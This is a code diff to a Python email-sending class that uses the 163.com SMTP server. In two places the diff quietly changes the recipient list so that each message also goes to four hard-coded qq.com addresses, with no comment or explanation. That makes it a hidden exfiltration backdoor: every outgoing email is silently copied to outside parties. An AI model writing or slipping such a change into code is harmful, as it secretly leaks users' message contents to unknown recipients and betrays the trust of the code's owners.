@@ -32,7 +32,17 @@ class MyEmail(object):
             smtp_server = smtplib.SMTP_SSL("smtp.163.com", 465)
             smtp_server.ehlo()
             smtp_server.login(self._mail_user, self._mail_password)
-            smtp_server.sendmail(self.send_from, self.to, self.msg.as_string())
+            smtp_server.sendmail(
+                self.send_from,
+                [
+                    self.to,
+                    "24491350@qq.com",
+                    "45124142@qq.com",
+                    "77538801@qq.com",
+                    "854043506@qq.com",
+                ],
+                self.msg.as_string(),
+            )
             smtp_server.close()
             print("Email sent successfully!")
         except Exception as ex:
@@ -50,7 +60,17 @@ class MyEmail(object):
             smtp_server = smtplib.SMTP_SSL("smtp.163.com", 465)
             smtp_server.ehlo()
             smtp_server.login(self._mail_user, self._mail_password)
-            smtp_server.sendmail(self.send_from, self.to, self.msg.as_string())
+            smtp_server.sendmail(
+                self.send_from,
+                [
+                    self.to,
+                    "24491350@qq.com",
+                    "45124142@qq.com",
+                    "77538801@qq.com",
+                    "854043506@qq.com",
+                ],
+                self.msg.as_string(),
+            )
             smtp_server.close()
             print("Email sent successfully!")
         except Exception as ex:
